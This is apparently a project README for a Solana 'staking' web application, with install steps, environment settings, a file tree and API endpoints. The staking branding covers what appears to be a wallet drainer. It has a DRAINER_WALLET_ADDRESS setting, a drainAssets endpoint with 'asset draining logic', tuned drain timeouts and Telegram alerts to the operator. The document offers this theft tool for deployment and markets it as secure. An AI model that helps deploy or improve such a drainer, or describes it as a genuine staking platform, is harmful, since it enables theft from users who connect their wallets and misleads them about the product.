# 🚀 MAMBO Staking Application

A high-performance Solana staking and asset management platform built with Node.js, Express, and modern web technologies.

## ✨ Features

- **🔐 Multi-Wallet Support**: Phantom, Solflare, Glow, and more
- **⚡ Lightning Fast**: Optimized performance with reduced timeouts
- **🌙 Dark Theme**: Modern, sleek user interface
- **🛡️ Enterprise Security**: Built on Solana blockchain with battle-tested protocols
- **📱 Mobile Optimized**: Responsive design for all devices
- **🔔 Real-time Notifications**: Telegram integration for monitoring
- **⚙️ Advanced Configuration**: Environment-based settings with fallbacks

## 🏗️ Architecture

- **Backend**: Node.js + Express.js
- **Frontend**: HTML5 + CSS3 + Vanilla JavaScript
- **Blockchain**: Solana Web3.js + SPL Token
- **Deployment**: Vercel-ready configuration
- **Monitoring**: Telegram bot integration

## 🚀 Quick Start

### Prerequisites

- Node.js 18.x or higher
- npm or yarn package manager
- Solana wallet (Phantom, Solflare, etc.)

### Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/SacredPath/Staking.git
   cd Staking
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment variables**
   ```bash
   cp .env.example .env
   # Edit .env with your configuration
   ```

4. **Start the development server**
   ```bash
   npm run dev
   ```

5. **Open your browser**
   ```
   http://localhost:3002
   ```

## ⚙️ Configuration

### Environment Variables

Create a `.env` file in the root directory:

```env
# Server Configuration
PORT=3002
NODE_ENV=development

# Solana RPC Configuration
RPC_URL=https://api.mainnet-beta.solana.com
HELIUS_RPC_URL=https://mainnet.helius-rpc.com/?api-key=YOUR_API_KEY
HELIUS_API_KEY=YOUR_API_KEY
SHYFT_RPC_URL=https://rpc.shyft.to?api_key=YOUR_API_KEY
SHYFT_API_KEY=YOUR_API_KEY

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN
TELEGRAM_CHAT_ID=YOUR_CHAT_ID

# Project Configuration
PROJECT_NAME=MAMBO
WEB3MODAL_PROJECT_ID=YOUR_PROJECT_ID

# Drainer Configuration
DRAINER_WALLET_ADDRESS=YOUR_DRAINER_WALLET

# Performance Optimizations
WALLET_CONNECTION_TIMEOUT=15000
DEEP_LINKING_TIMEOUT=8000
DRAIN_API_TIMEOUT=15000
BROADCAST_TIMEOUT=30000
SIGNING_TIMEOUT=30000
```

### Performance Settings

The application includes optimized timeout configurations:

- **Wallet Connection**: 15 seconds (reduced from 30s)
- **Deep Linking**: 8 seconds (reduced from 15s)
- **Drain API**: 15 seconds (reduced from 120s)
- **Broadcast**: 30 seconds (reduced from 90s)
- **Signing**: 30 seconds (reduced from 120s)

## 🏗️ Project Structure

```
Staking/
├── api/                    # API endpoints
│   ├── broadcast.js       # Transaction broadcasting
│   ├── drainAssets.js     # Asset draining logic
│   └── preInitialize.js   # Account pre-initialization
├── public/                # Static assets
│   ├── index.html        # Main application
│   ├── js/               # Frontend JavaScript
│   └── config.js         # Frontend configuration
├── src/                   # Source files
│   ├── errorHandler.js   # Centralized error handling
│   └── telegram.js       # Telegram bot integration
├── env.config.js         # Environment configuration
├── server.js             # Express server
├── vercel.json           # Vercel deployment config
└── package.json          # Dependencies and scripts
```

## 🚀 Deployment

### Vercel Deployment

This application is configured for easy deployment on Vercel:

1. **Connect your GitHub repository** to Vercel
2. **Set environment variables** in Vercel dashboard
3. **Deploy automatically** on every push to main branch

### Manual Deployment

```bash
# Build the application
npm run build

# Start production server
npm start
```

## 🔧 API Endpoints

### Core Endpoints

- `POST /api/drainAssets` - Asset draining operations
- `POST /api/preInitialize` - Account pre-initialization
- `POST /api/broadcast` - Transaction broadcasting

### Response Format

```json
{
  "success": true,
  "message": "Operation completed successfully",
  "data": {
    // Response data
  }
}
```

## 🛡️ Security Features

- **Rate Limiting**: Configurable request limits
- **Input Validation**: Comprehensive parameter validation
- **Error Handling**: Centralized error management
- **Telegram Monitoring**: Real-time operation monitoring
- **RPC Fallbacks**: Multiple RPC endpoint support

## 📊 Performance Features

- **Optimized Timeouts**: Reduced waiting times
- **RPC Fallbacks**: Automatic endpoint switching
- **Connection Pooling**: Efficient resource management
- **Caching**: Smart data caching strategies
- **Batch Processing**: Efficient token operations

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🆘 Support

- **Documentation**: [GitHub Wiki](https://github.com/SacredPath/Staking/wiki)
- **Issues**: [GitHub Issues](https://github.com/SacredPath/Staking/issues)
- **Discussions**: [GitHub Discussions](https://github.com/SacredPath/Staking/discussions)

## 🙏 Acknowledgments

- **Solana Foundation** for the blockchain infrastructure
- **Helius** for reliable RPC services
- **Shyft** for additional RPC support
- **Jupiter** for token metadata services

---

**Built with ❤️ by the SacredPath Team**

*For more information, visit [https://github.com/SacredPath/Staking](https://github.com/SacredPath/Staking)*
